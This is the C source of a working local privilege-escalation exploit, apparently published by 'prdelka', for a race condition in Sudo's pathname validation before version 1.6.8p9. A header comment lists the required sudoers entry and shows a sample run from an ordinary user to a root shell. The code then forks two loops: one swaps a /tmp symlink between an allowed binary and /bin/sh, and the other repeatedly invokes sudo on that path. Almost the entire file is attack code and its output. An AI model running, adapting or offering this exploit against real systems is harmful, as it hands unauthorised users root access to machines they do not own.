/* Race condition in Sudo's pathname validation 
 * ============================================
 * A race condition in Sudo's command pathname handling prior to 
 * Sudo version 1.6.8p9 that could allow a user with Sudo privileges
 * to run arbitrary commands. 
 * 
 * For this exploit to function correctly you need an entry in 
 * the sudoers file similar to the following.
 *
 * someuser	server=/bin/echo
 * root		server=ALL
 * 
 * The bug is fixed in sudo 1.6.8p9, exploit tested 1.6.7p5 & 1.6.8p2
 *
 * user@linux user $ id
 * uid=1000(user) gid=100(users) groups=100(users)
 * user@linux user $ sudo -V
 * Sudo version 1.6.8p2
 * user@linux user $ ./prdelka-vs-GNU-sudo root /bin echo
 * [ Race condition in Sudo's pathname validation
 * Sorry, user user is not allowed to execute '/tmp/echo' as root on linux.
 * Sorry, user user is not allowed to execute '/tmp/echo' as root on linux.
 * Sorry, user user is not allowed to execute '/tmp/echo' as root on linux.
 * <SNIP></SNIP> 
 * echo-2.05b# id
 * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm
 * ),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
 * echo-2.05b#
 *
 * - prdelka
 */ 
#include <stdio.h>
#include <stdlib.h>

void link_race_loop(char* binpath, char* bin)
{
        char ln[]="ln -sf ";
        char ln2[]="/";
        char ln3[]=" /tmp/";
        char shell[]="/bin/sh";        
	int size = strlen(binpath) + strlen(bin) + strlen(bin) + 14;	
	int size2 = strlen(bin) + 20;	
	void* buffer = malloc(size);
	void* buffer2 = malloc(size2);	
	memset(buffer,'\x00',size);
	memset(buffer2,'\x00',size2);
	strncpy((char*)buffer,ln,strlen(ln));
	strncat((char*)buffer,binpath,strlen(binpath)); 
	strncat((char*)buffer,ln2,strlen(ln2)); 
	strncat((char*)buffer,bin,strlen(bin)); 
	strncat((char*)buffer,ln3,strlen(ln3));
	strncat((char*)buffer,bin,strlen(bin));
        strncpy((char*)buffer2,ln,strlen(ln));  
        strncat((char*)buffer2,shell,strlen(shell));
        strncat((char*)buffer2,ln3,strlen(ln3)); 
        strncat((char*)buffer2,bin,strlen(bin)); 	
	system((char*)buffer);
	system((char*)buffer2);
	free(buffer);
	free(buffer2);	
}

int main(int argc,char* argv[])
{
	int pid,size;
	void* buffer;
	printf("[ Race condition in Sudo's pathname validation\n");
	if(argc < 4)
	{
		printf("[ Usage. %s (username|\\\\#uid) (binpath) (bin)\n",argv[0]);
		exit(0);
	}
	switch(pid = fork())
	{
		case 0:
			while(1)link_race_loop(argv[2],argv[3]);
		break;	
		default:
			size = strlen(argv[1]) + strlen(argv[3]);			
			size = size + 14;
			buffer = malloc(size);
			memset(buffer,'\x00',size);
			sprintf(buffer,"sudo -u %s /tmp/%s",argv[1],argv[3]);		
			while(1)system((char*) buffer);	
	}
}
